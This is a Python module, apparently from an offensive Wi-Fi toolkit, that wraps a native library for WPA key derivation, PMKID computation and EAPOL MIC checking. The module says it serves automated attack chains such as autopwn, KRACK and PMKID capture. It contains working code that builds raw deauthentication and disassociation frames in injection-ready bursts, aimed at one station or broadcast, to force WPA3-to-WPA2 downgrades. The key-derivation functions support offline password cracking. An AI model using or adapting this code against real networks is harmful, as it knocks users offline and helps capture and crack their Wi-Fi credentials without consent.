"""
posframework.native.crypto_accel - ctypes wrapper for libcrypto_accel.so

Provides cryptographic acceleration for automated attack chains:
- PBKDF2-SHA1 for WPA PSK derivation
- PTK derivation (PRF-512)
- PMKID computation and validation
- EAPOL MIC verification
- Downgrade attack frame building
- Automated attack vector assembly

Used by autopwn_engine.py, krack.py, pmkid.py, and handshake.py.
Falls back to Python implementations if native library is not compiled.
"""

import ctypes
import struct
import hashlib
import hmac
from ctypes import (c_int, c_uint8, c_size_t, c_char_p,
                    c_void_p, POINTER)
from typing import List, Optional, Tuple

from posframework.config import log
from posframework.native import get_lib

# --- Constants ---

PMK_LEN = 32
PTK_LEN = 80
MIC_LEN = 16
NONCE_LEN = 32
PMKID_LEN = 16

# Downgrade attack types
DOWNGRADE_DEAUTH = 0
DOWNGRADE_DISASSOC = 1
DOWNGRADE_SA_QUERY = 2
DOWNGRADE_CHANNEL_SWITCH = 3
DOWNGRADE_CSA_BEACON = 4

# --- Native Library Setup ---

_lib = get_lib("libcrypto_accel")
_USE_NATIVE = _lib is not None

if _USE_NATIVE:
    _lib.hmac_sha1.argtypes = [
        POINTER(c_uint8), c_size_t,
        POINTER(c_uint8), c_size_t,
        POINTER(c_uint8),
    ]
    _lib.hmac_sha1.restype = c_int

    _lib.pbkdf2_sha1.argtypes = [c_char_p, POINTER(c_uint8), c_size_t, POINTER(c_uint8)]
    _lib.pbkdf2_sha1.restype = c_int

    _lib.derive_ptk.argtypes = [
        POINTER(c_uint8),
        POINTER(c_uint8), POINTER(c_uint8),
        POINTER(c_uint8), POINTER(c_uint8),
        POINTER(c_uint8),
    ]
    _lib.derive_ptk.restype = c_int

    _lib.compute_pmkid.argtypes = [
        POINTER(c_uint8),
        POINTER(c_uint8), POINTER(c_uint8),
        POINTER(c_uint8),
    ]
    _lib.compute_pmkid.restype = c_int

    _lib.verify_eapol_mic.argtypes = [
        POINTER(c_uint8),
        POINTER(c_uint8), c_size_t,
        POINTER(c_uint8), c_int,
    ]
    _lib.verify_eapol_mic.restype = c_int

    _lib.build_downgrade_frame.argtypes = [
        POINTER(c_uint8), c_int,
        POINTER(c_uint8), POINTER(c_uint8),
        POINTER(c_uint8), c_int,
    ]
    _lib.build_downgrade_frame.restype = c_size_t

    _lib.generate_nonce.argtypes = [POINTER(c_uint8)]
    _lib.generate_nonce.restype = c_int

    _lib.build_attack_vector.argtypes = [
        POINTER(c_uint8), c_size_t,
        POINTER(c_int),
        POINTER(c_uint8), POINTER(c_uint8),
        c_int, c_int, c_int,
    ]
    _lib.build_attack_vector.restype = c_size_t

    log.debug("crypto_accel: using native C implementation")
else:
    log.warning("crypto_accel: libcrypto_accel.so not available, using Python fallback")


# --- Helper Functions ---

def _mac_to_bytes(mac: str) -> bytes:
    """Convert MAC string to 6 bytes."""
    parts = mac.lower().split(":")
    if len(parts) != 6:
        raise ValueError(f"Invalid MAC: {mac}")
    return bytes(int(p, 16) for p in parts)


def _mac_to_ctypes(mac: str) -> "ctypes.Array":
    """Convert MAC string to ctypes uint8 array."""
    raw = _mac_to_bytes(mac)
    return (c_uint8 * 6)(*raw)


# --- Public API ---

def pbkdf2_derive_pmk(passphrase: str, ssid: str) -> bytes:
    """
    Derive WPA PMK from passphrase and SSID using PBKDF2-SHA1.

    Standard WPA uses 4096 iterations of HMAC-SHA1.

    Args:
        passphrase: WiFi password
        ssid: Network SSID

    Returns:
        32-byte PMK (Pairwise Master Key).
    """
    if _USE_NATIVE:
        output = (c_uint8 * PMK_LEN)()
        ssid_bytes = ssid.encode("utf-8")
        ssid_arr = (c_uint8 * len(ssid_bytes))(*ssid_bytes)

        result = _lib.pbkdf2_sha1(
            passphrase.encode("utf-8"),
            ssid_arr, len(ssid_bytes),
            output,
        )
        if result == 0:
            return bytes(output)
        log.warning("crypto_accel: pbkdf2_sha1 failed, using Python fallback")

    # Python fallback
    return hashlib.pbkdf2_hmac("sha1", passphrase.encode("utf-8"),
                               ssid.encode("utf-8"), 4096, dklen=32)


def derive_ptk(pmk: bytes, ap_mac: str, sta_mac: str,
               anonce: bytes, snonce: bytes) -> bytes:
    """
    Derive PTK from PMK and handshake nonces.

    Args:
        pmk: 32-byte Pairwise Master Key
        ap_mac: AP MAC address string
        sta_mac: Station MAC address string
        anonce: 32-byte AP nonce
        snonce: 32-byte Station nonce

    Returns:
        80-byte PTK (Pairwise Transient Key).
    """
    if _USE_NATIVE:
        ptk_out = (c_uint8 * PTK_LEN)()
        pmk_arr = (c_uint8 * PMK_LEN)(*pmk)
        ap_arr = _mac_to_ctypes(ap_mac)
        sta_arr = _mac_to_ctypes(sta_mac)
        anonce_arr = (c_uint8 * NONCE_LEN)(*anonce)
        snonce_arr = (c_uint8 * NONCE_LEN)(*snonce)

        result = _lib.derive_ptk(
            pmk_arr, ap_arr, sta_arr, anonce_arr, snonce_arr, ptk_out
        )
        if result == 0:
            return bytes(ptk_out)

    # Python fallback (simplified PRF-512)
    return _py_derive_ptk(pmk, _mac_to_bytes(ap_mac), _mac_to_bytes(sta_mac),
                          anonce, snonce)


def compute_pmkid(pmk: bytes, ap_mac: str, sta_mac: str) -> bytes:
    """
    Compute PMKID from PMK and MAC addresses.

    PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AA || SPA)

    Args:
        pmk: 32-byte PMK
        ap_mac: AP MAC address string
        sta_mac: Station MAC address string

    Returns:
        16-byte PMKID.
    """
    if _USE_NATIVE:
        pmkid_out = (c_uint8 * PMKID_LEN)()
        pmk_arr = (c_uint8 * PMK_LEN)(*pmk)
        ap_arr = _mac_to_ctypes(ap_mac)
        sta_arr = _mac_to_ctypes(sta_mac)

        result = _lib.compute_pmkid(pmk_arr, ap_arr, sta_arr, pmkid_out)
        if result == 0:
            return bytes(pmkid_out)

    # Python fallback
    data = b"PMK Name" + _mac_to_bytes(ap_mac) + _mac_to_bytes(sta_mac)
    return hmac.new(pmk, data, hashlib.sha1).digest()[:16]


def verify_mic(kck: bytes, eapol_frame: bytes, expected_mic: bytes,
               key_ver: int = 2) -> bool:
    """
    Verify the MIC on an EAPOL key frame.

    Args:
        kck: 16-byte Key Confirmation Key (PTK[0:16])
        eapol_frame: Raw EAPOL frame with MIC field zeroed
        expected_mic: 16-byte expected MIC value
        key_ver: Key descriptor version (1=MD5, 2=SHA1)

    Returns:
        True if MIC matches, False otherwise.
    """
    if _USE_NATIVE:
        kck_arr = (c_uint8 * 16)(*kck)
        frame_arr = (c_uint8 * len(eapol_frame))(*eapol_frame)
        mic_arr = (c_uint8 * MIC_LEN)(*expected_mic)

        result = _lib.verify_eapol_mic(
            kck_arr, frame_arr, len(eapol_frame), mic_arr, key_ver
        )
        return result == 1

    # Python fallback
    if key_ver == 2:
        computed = hmac.new(kck, eapol_frame, hashlib.sha1).digest()[:16]
    else:
        computed = hmac.new(kck, eapol_frame, hashlib.md5).digest()[:16]
    return computed == expected_mic


def build_downgrade_frame(attack_type: int, ap_mac: str,
                          sta_mac: Optional[str] = None,
                          channel: int = 6) -> bytes:
    """
    Build a downgrade attack frame for WPA3->WPA2 forcing.

    Args:
        attack_type: DOWNGRADE_* constant
        ap_mac: AP MAC address
        sta_mac: Target station MAC (None for broadcast)
        channel: WiFi channel

    Returns:
        Raw frame bytes ready for injection.
    """
    if _USE_NATIVE:
        frame_out = (c_uint8 * 256)()
        ap_arr = _mac_to_ctypes(ap_mac)
        bssid_arr = _mac_to_ctypes(ap_mac)

        if sta_mac:
            sta_arr = _mac_to_ctypes(sta_mac)
            frame_len = _lib.build_downgrade_frame(
                frame_out, attack_type, ap_arr, sta_arr, bssid_arr, channel
            )
        else:
            frame_len = _lib.build_downgrade_frame(
                frame_out, attack_type, ap_arr, None, bssid_arr, channel
            )

        if frame_len > 0:
            return bytes(frame_out[:frame_len])

    # Python fallback: build basic deauth frame
    return _py_build_downgrade(attack_type, ap_mac, sta_mac, channel)


def build_attack_vector(ap_mac: str, sta_mac: Optional[str],
                        channel: int, attack_type: int,
                        burst_count: int = 5) -> Tuple[bytes, int]:
    """
    Build a complete automated attack vector payload.

    Generates a burst of frames for the specified attack type,
    ready for injection via raw socket.

    Args:
        ap_mac: AP MAC address
        sta_mac: Target station MAC (None for broadcast)
        channel: WiFi channel
        attack_type: DOWNGRADE_* constant
        burst_count: Number of frames to generate

    Returns:
        Tuple of (frame_data_bytes, frame_count).
    """
    if _USE_NATIVE:
        buf_size = burst_count * 256
        buf = (c_uint8 * buf_size)()
        frame_count = c_int(0)
        ap_arr = _mac_to_ctypes(ap_mac)

        if sta_mac:
            sta_arr = _mac_to_ctypes(sta_mac)
        else:
            sta_arr = None

        total = _lib.build_attack_vector(
            buf, buf_size, ctypes.byref(frame_count),
            ap_arr, sta_arr, channel, attack_type, burst_count
        )

        if total > 0:
            return bytes(buf[:total]), frame_count.value

    # Python fallback
    frames = bytearray()
    count = 0
    for _ in range(burst_count):
        frame = build_downgrade_frame(attack_type, ap_mac, sta_mac, channel)
        if frame:
            frames.extend(frame)
            count += 1
    return bytes(frames), count


def generate_nonce() -> bytes:
    """Generate a random 32-byte nonce."""
    if _USE_NATIVE:
        nonce = (c_uint8 * NONCE_LEN)()
        if _lib.generate_nonce(nonce) == 0:
            return bytes(nonce)
    # Python fallback
    import os
    return os.urandom(NONCE_LEN)


# --- Python Fallback Implementations ---

def _py_derive_ptk(pmk: bytes, ap_mac: bytes, sta_mac: bytes,
                   anonce: bytes, snonce: bytes) -> bytes:
    """Python PRF-512 for PTK derivation."""
    # Sort MACs and nonces
    mac_min = min(ap_mac, sta_mac)
    mac_max = max(ap_mac, sta_mac)
    nonce_min = min(anonce, snonce)
    nonce_max = max(anonce, snonce)

    data = mac_min + mac_max + nonce_min + nonce_max
    label = b"Pairwise key expansion"

    result = b""
    counter = 0
    while len(result) < PTK_LEN:
        msg = label + b"\x00" + data + bytes([counter])
        result += hmac.new(pmk, msg, hashlib.sha1).digest()
        counter += 1

    return result[:PTK_LEN]


def _py_build_downgrade(attack_type: int, ap_mac: str,
                        sta_mac: Optional[str], channel: int) -> bytes:
    """Python fallback for downgrade frame building."""
    radiotap = b"\x00\x00\x08\x00\x00\x00\x00\x00"
    broadcast = b"\xff\xff\xff\xff\xff\xff"
    target = _mac_to_bytes(sta_mac) if sta_mac else broadcast
    ap = _mac_to_bytes(ap_mac)

    if attack_type == DOWNGRADE_DEAUTH:
        frame = bytearray(radiotap)
        frame += struct.pack("<H", 0x00C0)  # FC: deauth
        frame += struct.pack("<H", 0)       # Duration
        frame += target + ap + ap
        frame += struct.pack("<H", 0)       # Seq
        frame += struct.pack("<H", 7)       # Reason
        return bytes(frame)
    elif attack_type == DOWNGRADE_DISASSOC:
        frame = bytearray(radiotap)
        frame += struct.pack("<H", 0x00A0)
        frame += struct.pack("<H", 0)
        frame += target + ap + ap
        frame += struct.pack("<H", 0)
        frame += struct.pack("<H", 4)
        return bytes(frame)
    else:
        # Default to deauth for unsupported types in fallback
        frame = bytearray(radiotap)
        frame += struct.pack("<H", 0x00C0)
        frame += struct.pack("<H", 0)
        frame += target + ap + ap
        frame += struct.pack("<H", 0)
        frame += struct.pack("<H", 7)
        return bytes(frame)
